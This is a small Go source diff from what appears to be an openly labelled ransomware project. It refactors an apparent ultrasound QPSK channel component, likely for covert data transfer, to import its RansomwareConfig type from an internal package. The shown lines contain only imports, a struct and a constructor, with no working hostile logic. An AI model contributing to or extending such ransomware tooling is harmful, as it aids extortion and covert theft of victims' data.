@@ -1,5 +1,7 @@
 package ransomware
 
+import rw "github.com/ruby570bocadito/x404x/internal/ransomware"
+
 import (
 	"bytes"
 	"encoding/base64"
@@ -13,7 +15,7 @@ import (
 )
 
 type UltrasoundQPSK struct {
-	config       *RansomwareConfig
+	config       *rw.RansomwareConfig
 	sampleRate   int
 	carrierFreq  float64
 	symbolRate   float64
@@ -26,7 +28,7 @@ const (
 	defaultQPSKSymbolRate = 100.0
 )
 
-func NewUltrasoundQPSK(cfg *RansomwareConfig) *UltrasoundQPSK {
+func NewUltrasoundQPSK(cfg *rw.RansomwareConfig) *UltrasoundQPSK {
 	return &UltrasoundQPSK{
 		config:      cfg,
 		sampleRate:  defaultSampleRate,
